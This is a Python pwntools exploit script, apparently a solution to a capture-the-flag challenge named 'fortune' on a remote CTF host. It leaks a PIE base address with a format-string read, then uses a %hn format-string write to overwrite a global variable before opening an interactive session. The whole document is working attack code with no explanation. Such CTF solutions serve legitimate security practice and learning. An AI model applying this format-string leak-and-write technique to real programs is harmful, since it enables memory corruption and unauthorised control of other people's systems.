#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "fortune-teller-cb410128dd42.inst15.ctf.fortid.com"
elf = context.binary = ELF('./fortune', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x00000000000014D9
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl = True, sni = HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt):
	sla(b'> ', str(opt).encode())

menu(1)
# GDB()
sla(b'> ',  b'%41$p')
p.recvuntil(b'The oracle speaks:\n')
PIE = int(p.recvline().strip(), 16) - 0x1664
log.info(f'PIE : {hex(PIE)}')

tg = PIE + 0x000000000000404C

fmt = f'%{0x1337}c%10$hn'.encode()
pl = fmt.ljust(0x20, b'A')
pl += p64(tg)
menu(1)
# GDB()
sla(b'> ', pl)
menu(2)
p.interactive()